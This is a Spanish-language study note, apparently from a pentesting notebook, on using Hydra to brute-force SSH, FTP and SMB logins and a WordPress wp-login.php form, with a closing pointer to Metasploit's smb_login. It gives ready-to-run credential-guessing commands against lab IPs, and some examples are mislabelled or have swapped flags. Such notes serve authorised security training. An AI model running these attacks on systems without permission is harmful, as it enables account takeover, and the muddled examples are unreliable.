-----------
- Tags: #tools #comands #software #hydra #wordpress 
-----------

# Definicion

- Hydra es una herramienta preinstalada en Kali Linux utilizada para hacer fuerza bruta con nombres de usuario y contraseñas de diferentes servicios como FTP, ssh, telnet, MS SQL, etc. La fuerza bruta se puede utilizar para probar diferentes nombres de usuario y contraseñas contra un objetivo para identificar las credenciales correctas.

## Uso:
```bash
 hydra -l <username> -p <password>  <server> <service>
```

- Ejemplo sin conocer ni contraseña ni usuario
```bash
 hydra -l molly -p butterfly 10.10.137.76 ssh
```

- Ejemplo conociendo la *contraseña*
```
hydra -L users.txt -p butterfly 10.10.137.76 ssh
```

- Ejemplo conociendo el *usuario*
```bash
hydra -l usuario -P /usr/share/wordlists/rockyou.txt 10.10.137.76 ssh
```

-------------------------------------

# BruteForce Login Panel

- Panel attack BruteForce, no Error
```
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.3.215 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'   
```


- Panel Attack BruteForce *Error*
```
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.3.215 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=<ErrorMessage>'   
```


-------------------

### Como podemos ver el uso es muy similar, cuando conocemos la credencial o el campo, hacemos uso de la letra en *minusculas*, y cuando no lo conocemos y queremos hace uso de un diccionario en su lugar, lo ponemos en *MAYUSCULAS*.

### De igual manera, con hydar podemos no solo hacer ataques por [[SSH - 22]] tambien podriamos cambiar este campo a otro protocolo, como por ejemplo el [[FTP - 21]] o [[SMB - 445]]

```bash
hydra -P users.txt -L passwords.txt smb://<IpVictima>
```

## En caso que no nos deje hacer el BruteForce, intentar con [[Metasploit]]
```bash
msfconsole -q
search smb_login
```

